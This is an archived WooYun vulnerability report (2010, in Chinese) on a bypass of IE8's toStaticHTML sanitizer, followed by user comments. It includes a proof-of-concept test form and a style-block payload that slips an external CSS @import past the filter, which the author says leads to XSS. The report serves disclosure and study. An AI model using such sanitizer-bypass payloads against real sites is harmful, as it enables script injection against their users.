{"id": 24369, "wybug_id": "wooyun-2010-0189", "wybug_title": "IE8 toStaticHtml Bypass漏洞", "wybug_corp": "微软", "wybug_author": "结界师", "wybug_date": "2010-08-13 11:01", "wybug_open_date": "2010-08-13 11:01", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["富文本策略绕过", "逻辑错误", "浏览器"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2010-08-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2010-08-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： toStaticHtml是微软在IE8中新提供的一个接口，号称解决xss问题http://blogs.msdn.com/b/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx<code>Safer Mashups: HTML SanitizationIE8 exposes a new method on the window object named toStaticHTML. When a string of HTML is passed to this function, any potentially executable script constructs are removed before the string is returned. Internally, this function is based on the same technologies as the server-side Microsoft Anti-Cross Site Scripting Library mentioned previously.So, for example, you can use toStaticHTML to help ensure that HTML received from a postMessage call cannot execute script, but can take advantage of basic formatting:document.attachEvent('onmessage',function(e) {    if (e.domain == 'weather.example.com') {       spnWeather.innerHTML = window.toStaticHTML(e.data);   } }Calling:window.toStaticHTML(\"This is some <b>HTML</b> with embedded script following... <script>alert('bang!');</script>!\");will return:This is some <b>HTML</b> with embedded script following... !</code>80sec在其中发现一个安全缺陷可以导致绕过，所有使用tostatichtml的将依然导致xss 详细说明：  良好的愿望不代表良好的实现，tostatichtml最终的实现依赖于字符串的正则分析和最终浏览器真实的解析，逻辑的不同就可能导致绕过。微软实现的正则里存在问题加上很勺的IE本身的不规范性导致绕过   漏洞证明：  <script type=\"text/javascript\">function fuckie() {    var szInput = document.shit.input.value;    var szStaticHTML = toStaticHTML(szInput);    ResultComment = szStaticHTML;    document.shit.output.value = ResultComment;}</script><form name=\"shit\"><textarea name='input'  cols=40 rows=20></textarea><textarea name='output' cols=40 rows=20></textarea><input type=button value=\"fuck_me\" name=\"fuck\" onclick=fuckie();></form> \n<style>}@import url('//127.0.0.1/1.css');aaa{;}</style><div id=\"x\">Fuck Ie</div>\n这样就可以引入1.css，然后随便xsssssssssssssss   修复方案：  自己看着修补吧，又不只一个case :)   版权声明：转载请注明来源 结界师@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2012-02-05 22:10 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  toStaticHTML 。 。 第一次看到这个函数。     \n     2012-05-13 22:16 |    \t\t路人玾 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 你们懂的)\t\t \n  这个函数开发人员很少知道,对字符的处理要么自己写一个,要么忽略掉.ps:现在很多开发的人不知道xss    \n     2012-08-31 20:55 |    \t\tsoftbug \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:10        | 为人类设计最好的软件，解放人的双手,一起...)\t\t \n  MSDN嘛    \n     2013-07-13 16:51 |    \t\t乔治 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  虽然不知道说的什么，但是好像很厉害的样子！    \n     2014-07-02 14:07 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  toStaticHTML 在web之困看到有做介绍，第一时间就想到这篇帖子了。    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}